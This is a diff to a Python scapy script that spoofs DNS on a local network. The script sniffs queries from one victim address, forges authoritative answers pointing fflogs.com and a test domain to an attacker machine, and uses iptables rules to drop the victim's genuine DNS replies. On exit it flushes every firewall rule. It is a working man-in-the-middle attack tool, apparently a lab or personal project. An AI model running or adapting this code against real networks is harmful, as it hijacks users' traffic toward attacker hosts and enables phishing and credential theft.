@@ -4,23 +4,31 @@ from cython import *
 import scapy.all as scapy
 import os
 
+dns_hosts={
+    b"fflogs.com.":"192.168.1.83",
+    b"www.fflogs.com.":"192.168.1.83",
+    b"www.thisisatest.com.":"192.168.1.83",
+    b"thisisatest.com.":"192.168.1.83"
+}
+
 #sniffpackets function
 def sniffpackets(interface):
     #sniff for DNS traffic
-    scapy.sniff(iface=interface,count=0,filter="udp", store=False, prn=process_sniffed_packet)
+    scapy.sniff(iface=interface,count=0,filter="host 192.168.1.76", store=False, prn=process_sniffed_packet)
 
 def create_packet(packet):
     #create a new packet using info from original packet
     #eth
-    eth = scapy.Ether(dst=packet[scapy.Ether].src,src=packet[scapy.Ether].dst)
+    eth = scapy.Ether(dst=packet[scapy.Ether].src, src=packet[scapy.Ether].dst)
     #ip
-    ip = scapy.IP(src=packet[scapy.IP].dst,dst=packet[scapy.IP].src)
+    ip = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src)
     #udp
     udp = scapy.UDP(sport=packet[scapy.UDP].dport,dport=packet[scapy.UDP].sport)
     #dns
     dns = scapy.DNS(
         id=packet[scapy.DNS].id,
         qd=packet[scapy.DNS].qd,
+        opcode=packet[scapy.DNS].opcode,
         aa=1,
         rd=0,
         qr=1,
@@ -43,11 +51,18 @@ def process_sniffed_packet(packet):
         #reply with spoofed packet
         qname = packet[scapy.DNSQR].qname.decode()
         print(qname)
-        if packet.getlayer(scapy.DNSQR).qname == 'www.fflogs.com.':
+        if packet.getlayer(scapy.DNSQR).qname in dns_hosts and packet.getlayer(scapy.IP).src == '192.168.1.76':
             print('[+] Spoofing packet')
-            packet.show()
-            new_packet = create_packet(packet)
-            scapy.sendp(new_packet)
+            # packet.show()
+            try:
+                new_packet = create_packet(packet)
+                new_packet.show()
+                scapy.sendp(new_packet)
+                return
+            except IndexError as e:
+                print("error")
+                print(e)
+                # scapy.send(packet)
 
 
 def main():
@@ -55,8 +70,19 @@ def main():
     sniffpackets("wlo1")
 
 if __name__ == "__main__":
-    os.system("iptables -A FORWARD -p udp --sport 53 -d 192.168.1.76 -j DROP")
-    os.system("iptables -A FORWARD -p tcp --sport 53 -d 192.168.1.76 -j DROP")
-    os.system("iptables -A FORWARD -p udp --sport 53 -s 192.168.1.76 -j DROP")
-    os.system("iptables -A FORWARD -p tcp --sport 53 -s 192.168.1.76 -j DROP")
-    main()
+    try:
+        os.system("iptables -A FORWARD -p udp --sport 53 -d 192.168.1.76 -j DROP")
+        os.system("iptables -A FORWARD -p tcp --sport 53 -d 192.168.1.76 -j DROP")
+        os.system("iptables -A FORWARD -p udp --dport 53 -s 192.168.1.76 -j DROP")
+        os.system("iptables -A FORWARD -p tcp --dport 53 -s 192.168.1.76 -j DROP")
+        main()
+    except KeyboardInterrupt:
+        os.system("iptables --flush")
+        print("[+] Stopping DNS spoofing...")
+        exit()
+    except Exception as e:
+        print(e)
+    finally:
+        os.system("iptables --flush")
+        print("[+] Stopping DNS spoofing...")
+        exit()
